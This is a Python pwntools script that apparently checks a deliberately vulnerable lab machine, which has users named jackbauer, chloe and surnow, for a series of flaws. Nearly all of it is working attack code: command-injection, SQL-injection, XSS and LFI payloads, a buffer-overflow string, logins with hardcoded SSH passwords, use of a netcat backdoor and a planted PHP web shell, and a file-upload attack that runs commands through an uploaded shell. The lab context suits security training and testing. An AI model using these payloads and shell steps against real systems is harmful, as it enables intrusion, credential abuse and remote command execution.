#!/usr/bin/python

from pwn import *
import re
import requests


class test_vulns():
    def test_cmd_injection(self, ip):
        """
        Test for command injection on port 2222
        @param ip: ip address of target
        """
        try:
            conn = remote(ip, 2222)
            prompt = conn.recv()
            log.debug(prompt)
            conn.send("ls;ls /home/\n")
            results = conn.recv()
        except:
            log.info("Error connecting to " + ip)
            return None
        log.debug(results)
        conn.close()
        if "jackbauer" in results:
            log.info(ip + " VULNERABLE to cmd injection")
            return True
        else:
            log.info(ip + " NOT VULNERABLE cmd injection")
            return False

    def test_buffer_overflow(self, ip):
        """
        Test buffer overflow by sending a lot of A characters and checking for a segfault (ie. signal -11).
        Buffer overflow service is running on port 3333
        @param ip: ip address of target
        """
        try:
            conn = remote(ip, 3333)
            prompt = conn.recv()
            log.debug(prompt)
            overflow_string = "A" * 600 + "\n"
            conn.send(overflow_string)
            results = ""
            results = conn.recv()
        except:
            log.info("Error connecting to " + ip)
            return None
        conn.close()
        log.debug(results)
        if "-11" in results:
            log.info(ip + " VULNERABLE to buffer overflow")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to buffer overflow")
            return False

    def test_ssh_default(self, ip, username, pw):
        """
        @param ip: ip address of target
        @param username: ssh username
        @oaram pw: password
        """
        try:
            shell = ssh(username, ip, password=pw)
            results = ""
            results = shell["whoami"]
        except:
            log.info("Failed to connect to ssh " + ip)
            return None
        log.debug(results)
        shell.close()
        if username in results:
            log.info(ip + " VULNERABLE to default ssh " + username)
            return True
        else:
            log.info(ip + " NOT VULNERABLE to default ssh " + username)
            return False

    def test_backdoor_1(self, ip):
        """
        Test netcat backdoor. Default backdoor is on port 33123
        but the backdoor port will decrement after each successful connection
        @param ip: ip address of target
        """
        for i in range(33123, 33083, -1):
            port = i
            try:
                conn = remote(ip, port)
                results = ""
                if conn:
                    conn.send("ls /home/\n")
                    results = conn.recv()
                    conn.close()
                if "jackbauer" in results:
                    log.info(ip + " VULNERABLE to backdoor 1")
                    return True
            except:
                pass

    def test_backdoor_2(self, ip):
        """
        Test the php backdoor that was left on the machine in the images folder
        @param ip: ip address of target
        """
        url = "http://" + ip + \
            "/arbitrary_file_upload/images/shell.php?cmd=whoami"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Error connecting to backdoor 2 " + ip)
            return None
        if "www-data" in results:
            log.info(ip + " VULNERABLE to backdoor 2")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to backdoor 2")
            return False

    def test_lfi(self, ip):
        """
        Test local file inclusion vulnerability. This can be checked by giving a full path
        and without using ../
        @param ip: ip address of target
        """
        url = "http://" + ip + "/lfi/lfi.php?language=/etc/group"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Error performing web request to ")
            return None
        if "surnow" in results:
            log.info(ip + " VULNERABLE to lfi")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to lfi")
            return False

    def test_local_format_string(self, ip, username, pw, keyfile=None):
        """
        Test for local format string vulnerability. This can be accessed by jackbauer, chloe, and surnow.
        To verify this vulnerability we can check to see if we can read data off of the stack
        @param ip: ip address of target
        @param username: username to login with over ssh
        @param pw: password to login with over ssh
        """
        if keyfile:
            try:
                shell = ssh(username, ip, keyfile=keyfile)
            except:
                log.info(
                    "Failed to connect to local format string with key " + ip)
                pass
        if not shell:
            try:
                shell = ssh(username, ip, password=pw)
            except:
                log.info("Failed to connect to local format string " + ip)
                return False
        results = ""
        results = shell[
            "/home/jackbauer/services/c/formatme_local/printf %x%x%x"]
        evaluation = re.match(
            "[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
        log.info(results)
        shell.close()
        if evaluation:
            log.info(ip + " VULNERABLE to local format string")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to local format string")
            return False

    def test_reflected_xss(self, ip):
        """
        Test for reflected cross-site scripting (XSS)
        @param ip: ip address of target
        """
        url = "http://" + ip + \
            "/xss/xss.php?quote=<img%20src=x%20onerror=alert(1)>"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Failed to connect to reflected XSS " + ip)
            return None
        log.debug(results)
        if "<img src=x onerror=alert(1)>" in results:
            log.info(ip + " VULNERABLE to reflected xss")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to reflected xss")
            return False

    def test_sqli(self, ip):
        """
        Test for SQL injection (SQLi)
        @param  ip: ip address of target
        """
        log.debug("testing sqli on " + ip)
        results = ""
        # create SQL injection payload
        payload = {'codename_input': 'a" or 2 LIKE 2-- ', 'submitted': 'TRUE'}
        url = "http://" + ip + "/index.php"
        try:
            results = requests.post(url, data=payload)
            log.debug(results.text)
        except:
            log.info("Failed to connect to sqli " + ip)
            return None
        if "Tibet" in results.text:
            return True
        else:
            return False

    def test_local_format_string_chloe(self, ip):
        """
        Test local format string vulnerability as chloe user
        """
        self.test_local_format_string(
            ip, "chloe", "chloechloe", keyfile="id_rsa")

    def test_dom_based_xss(self, ip):
        """
        Test for dom based XSS
        @param ip: ip address of target
        """
        log.info("testing dom based xss")
        url = "http://" + ip + "/dom_based_xss/index.html"
        try:
            results = wget(url)
        except:
            log.info("Failed to connect to " + ip)
            return None
        if not results:
            return False

        if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results:
            log.info(ip + " VULNERABLE to dom based XSS")
            return True
        else:
            return False

    def test_arbitrary_file_upload(self, ip):
        """
        Test for arbitrary file upload. This function requires the existance of a local file called hacker_shell.php
        @param ip: ip address of target
        """
        url = "http://" + ip + "/arbitrary_file_upload/upload.php"
        try:
            hacker_shell = open('hacker_shell.php', 'rb')
        except:
            log.info(
                "Falied to open local file on server. Make sure hacker_shell.php is in current working directory")
            return None
        files = {'image': hacker_shell}
        try:
            results = requests.post(url, files=files)
        except:
            log.info("Failed to connect to " + ip)
            return None
        url2 = "http://" + ip + \
            "/arbitrary_file_upload/images/hacker_shell.php?cmd=id"
        try:
            results2 = requests.get(url2)
        except:
            return None
        if "www-data" in results2.text:
            log.info(ip + " VULNERABLE to arbitrary file upload")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to arbitrary file upload")
            return False

    def test_ssh_jackbauer(self, ip):
        return self.test_ssh_default(ip, "jackbauer", "devgru6")

    def test_ssh_chloe(self, ip):
        return self.test_ssh_default(ip, "chloe", "chloechloe")

    def test_ssh_surnow(self, ip):
        return self.test_ssh_default(ip, "surnow", "surnowsurnow")


if __name__ == "__main__":
    ip_addr = "192.168.3.117"
    t = test_vulns()
    context.log_level = "info"
    t.test_arbitrary_file_upload(ip_addr)
    t.test_dom_based_xss(ip_addr)
    t.test_sqli(ip_addr)
    t.test_cmd_injection(ip_addr)
    t.test_buffer_overflow(ip_addr)
    t.test_ssh_jackbauer(ip_addr)
    t.test_ssh_chloe(ip_addr)
    t.test_ssh_surnow(ip_addr)
    t.test_backdoor_1(ip_addr)
    t.test_backdoor_2(ip_addr)
    t.test_lfi(ip_addr)
    t.test_local_format_string_chloe(ip_addr)
    t.test_reflected_xss(ip_addr)
